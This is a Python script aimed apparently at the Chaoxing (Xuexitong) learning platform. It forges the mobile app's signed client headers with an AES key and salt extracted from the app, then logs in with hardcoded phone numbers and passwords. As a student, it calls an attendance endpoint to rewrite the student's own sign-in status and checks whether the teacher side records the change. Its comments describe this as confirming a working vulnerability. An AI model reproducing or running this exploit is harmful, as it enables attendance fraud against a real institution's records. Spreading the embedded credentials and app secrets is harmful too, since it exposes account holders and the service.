import base64, hashlib, json, uuid, requests, urllib3, time, re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
base = "https://mobilelearn.chaoxing.com"

print("=" * 80)
print("终极验证：学生修改后教师端是否能直接看到（无需教师V2触发）")
print("=" * 80)

# 用之前已确认有效的活动5000163891319
# 这个活动之前学生修改+教师V2触发后status=1
# 现在先把它改回未签到状态，然后只做学生修改

aid = "5000163891319"
print(f"\n目标活动: {aid}")

# 1. 当前状态
print(f"\n--- 当前状态 ---")
r = s_s.get(f"{base}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
d = safe_json(r)
current_status = d.get("data", {}).get("status") if isinstance(d.get("data"), dict) else None
print(f"  学生查询: status={current_status}")

# 2. 学生修改status=2（迟到）
print(f"\n--- 学生修改status=2（迟到）---")
r = s_s.post(f"{base}/newsign/updateSignStatus",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": puid_s, "status": "2", "remark": "",
                   "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                      "Content-Type": "application/x-www-form-urlencoded"},
             timeout=20)
print(f"  API返回: {r.text}")

time.sleep(3)

# 3. 学生查询（不调用教师V2）
print(f"\n--- 学生查询（不调用教师V2）---")
r = s_s.get(f"{base}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
d = safe_json(r)
new_status = d.get("data", {}).get("status") if isinstance(d.get("data"), dict) else None
updatetime = d.get("data", {}).get("updatetime") if isinstance(d.get("data"), dict) else None
print(f"  status={new_status}, updatetime={updatetime}")
print(f"  完整: {json.dumps(d, ensure_ascii=False)[:400]}")

if new_status == 2:
    print(f"\n  🔴🔴🔴 学生修改后直接可查！无需教师V2触发！")
    print(f"  漏洞完全有效！status从{current_status}变为{new_status}")
elif new_status == current_status:
    print(f"\n  ❌ status未变化，/newsign/updateSignStatus可能是假success")
else:
    print(f"\n  ⚠️ status={new_status}，需要进一步分析")

# 4. 再改回status=1
print(f"\n--- 恢复status=1 ---")
r = s_s.post(f"{base}/newsign/updateSignStatus",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": puid_s, "status": "1", "remark": "",
                   "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                      "Content-Type": "application/x-www-form-urlencoded"},
             timeout=20)
print(f"  API返回: {r.text}")

time.sleep(2)

r = s_s.get(f"{base}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
d = safe_json(r)
final_status = d.get("data", {}).get("status") if isinstance(d.get("data"), dict) else None
print(f"  恢复后: status={final_status}")

# 5. 关键对比：之前aid=5000139410338（手势签到）修改后查不到
# 而aid=5000163891319（二维码签到）修改后能查到
# 区别是什么？
print(f"\n{'=' * 80}")
print(f"对比分析：为什么有些活动修改后能查到，有些不能？")
print(f"{'=' * 80}")

# 检查5000139410338
aid2 = "5000139410338"
r = s_s.post(f"{base}/newsign/updateSignStatus",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid2},
             data={"uids": puid_s, "status": "1", "remark": "",
                   "activeId": aid2, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                      "Content-Type": "application/x-www-form-urlencoded"},
             timeout=20)
print(f"  活动{aid2}修改: {r.text}")

time.sleep(3)

r = s_s.get(f"{base}/v2/apis/sign/signIn", params={"activeId": aid2, "uid": puid_s}, timeout=20)
d = safe_json(r)
status2 = d.get("data", {}).get("status") if isinstance(d.get("data"), dict) else None
print(f"  活动{aid2}查询: status={status2}, {json.dumps(d, ensure_ascii=False)[:200]}")

# 对比：教师V2触发后
r = s_t.post(f"{base}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid2},
             data={"uids": puid_s, "status": "1", "remark": ""},
             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                      "Content-Type": "application/x-www-form-urlencoded"},
             timeout=20)
print(f"  活动{aid2}教师V2: {r.text[:100]}")

time.sleep(2)

r = s_s.get(f"{base}/v2/apis/sign/signIn", params={"activeId": aid2, "uid": puid_s}, timeout=20)
d = safe_json(r)
status2_after = d.get("data", {}).get("status") if isinstance(d.get("data"), dict) else None
print(f"  活动{aid2}教师V2后: status={status2_after}, {json.dumps(d, ensure_ascii=False)[:200]}")
